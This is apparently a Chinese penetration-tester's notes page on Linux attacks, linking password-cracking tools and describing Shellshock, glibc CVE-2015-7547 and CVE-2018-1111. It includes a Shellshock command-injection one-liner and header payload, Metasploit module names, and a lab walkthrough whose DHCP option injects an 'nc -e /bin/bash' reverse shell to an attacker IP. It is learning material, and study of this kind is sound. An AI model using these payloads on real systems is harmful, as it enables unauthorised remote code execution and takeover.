# Linux 渗透

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**渗透框架**
- [d4rk007/RedGhost](https://github.com/d4rk007/RedGhost) - linux 的后渗透框架,可用于权限维持、提权等操作，半图形化.实际测试感觉不太行。

---

# 口令破解

**文章**
- [How to Crack Shadow Hashes After Getting Root on a Linux System](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)
- [Linux下的密码Hash——加密方式与破解方法的技术整理](https://3gstudent.github.io/3gstudent.github.io/Linux%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81Hash-%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/)

**工具**
- [huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin) - 从当前 Linux 用户转储登录密码的工具

---

# 漏洞利用
## 提权

关于 linux 更多提权内容,见笔记 [权限提升](./后渗透/权限提升.md#linux) linux 提权部分

---

## 远程代码执行

**CVE-2014-6271** Bash 远程代码执行漏洞"破壳"
- 简介

    GNU Bash 是美国软件开发者布莱恩-福克斯（Brian J. Fox）为 GNU 计划而编写的一个 Shell（命令语言解释器），它运行于类 Unix 操作系统中（Linux 系统的默认 Shell），并能够从标准输入设备或文件中读取、执行命令，同时也结合了一部分 ksh 和 csh 的特点。

    GNU Bash 4.3 及之前版本中存在安全漏洞，该漏洞源于程序没有正确处理环境变量值内的函数定义。远程攻击者可借助特制的环境变量利用该漏洞执行任意代码。以下产品和模块可能会被利用：OpenSSH sshd 中的 ForceCommand 功能，Apache HTTP Server 中的 mod_cgi 和 mod_cgid 模块，DHCP客户端等。（说明：该漏洞的补丁并没有完全修复该问题，CNNVD-201409-956 补充了不完整修复后仍存在的问题）

- 文章
    - [Bash远程代码执行漏洞"破壳"(CVE-2014-6271)分析](https://www.antiy.com/response/CVE-2014-6271.html)

- POC | Payload | exp
    - [scottjpack/shellshock_scanner](https://github.com/scottjpack/shellshock_scanner)
    - [Bash - 'Shellshock' Environment Variables Command Injection](https://www.exploit-db.com/exploits/34766)

- 本地验证方法

    `env x='() { :;}; echo Vulnerable CVE-2014-6271 ' bash -c "echo test"`

    执行命令后,如果显示 Vulnerable CVE-2014-6271,证系统存在漏洞,可改变 echo Vulnerable CVE-2014-6271 为任意命令进行执行.

    `User-Agent: () { :;}; whoami`

- MSF 模块
    ```bash
    use exploit/linux/http/ipfire_bashbug_exec
    use exploit/multi/http/cups_bash_env_exec
    use exploit/unix/dhcp/bash_environment
    ```

**CVE-2015-7547**
- 简介

    Google 安全团队发现 glibc 存在的溢出漏洞。glibc 的 DNS 客户端解析器中存在基于栈的缓冲区溢出漏洞。当软件用到 getaddrinfo 库函数（处理名字到地址以及服务到端口的转换）时，攻击者便可借助特制的域名、DNS 服务器或中间人攻击利用该漏洞，控制软件，并试图控制整个系统。

    攻击者使用恶意的 DNS 域名服务器创建类似于 evildomain.com 的域名，然后向目标用户发送带有指向该域名的链接的邮件，一旦用户点击该链接，客户端或浏览器将会开始查找 evildomain.com，并最终得到恶意服务器的 buffer-busting 响应。该域名被嵌入服务器日志中，一旦解析就会触发远程代码执行，SSH 客户端也会因此被控制。或者，位于目标用户网络中的中间人攻击者可以篡改 DNS 响应，向恶意代码中动态注入负载。

    简单的说，只要控制了 linux 服务器所访问的 DNS 服务器，或者对 linux 服务器的流量进行劫持；那么，在 Linux 服务器做 DNS 请求时，恶意 DNS 服务器就可以对 linux 服务器进行远程溢出攻击，获取服务器权限。

- 文章
    - [CVE-2015-7547 - sevck](https://www.cnblogs.com/sevck/p/5225639.html)
    - [CVE-2015-7547的漏洞分析](http://blog.nsfocus.net/cve-2015-7547-vulnerability-analysis/)

- POC | Payload | exp
    - [fjserna/CVE-2015-7547](https://github.com/fjserna/CVE-2015-7547)

**CVE-2018-1111** DHCP 客户端脚本代码执行漏洞
- 简介

    Fedora 是由 Fedora 项目社区开发、美国红帽（Red Hat）公司赞助的一套基于 Linux 的操作系统。DHCP packages 是其中的一个动态主机配置协议软件包。

    Fedora 28 及之前版本、Red Hat Enterprise Linux 6 和 7 中的 DHCP 包的 NetworkManager integration 脚本存在命令注入漏洞。本地攻击者可通过伪造 DHCP 响应利用该漏洞在系统以 root 权限执行任意命令。

- 文章
    - [CVE-2018-1111 复现环境搭建与 dhcp 命令注入](https://www.freebuf.com/articles/web/191884.html)
    - [DHCP 客户端脚本代码执行漏洞分析 (CVE-2018-1111) ](https://xz.aliyun.com/t/2455)

- POC | Payload | exp
    - [knqyf263/CVE-2018-1111](https://github.com/knqyf263/CVE-2018-1111)
    - [kkirsche/CVE-2018-1111](https://github.com/kkirsche/CVE-2018-1111)

- 本地利用方法
    ```
    attacker: kali linux 2018 x64 192.168.71.5
    victim: Centos 7 x64 192.168.71.10
    ```
    ```vim
    vim dnsmasq.conf
    bind-interfaces
    interface=eth0
    except-interface=lo
    dhcp-range=192.168.71.10,192.168.71.20,12h
    dhcp-option=3,192.168.71.5
    dhcp-option=6,192.168.71.5
    log-queries
    log-facility=/var/log/dnsmasq.log
    ```
    ```
    dnsmasq -dC dnsmasq.conf --dhcp-option="252,malayke'&nc -e /bin/bash192.168.71.5 6666 #"
    nc -l -p 6666 -v
    ```
    重启 CentOS 的网络服务,然后 shell 就反弹回来了
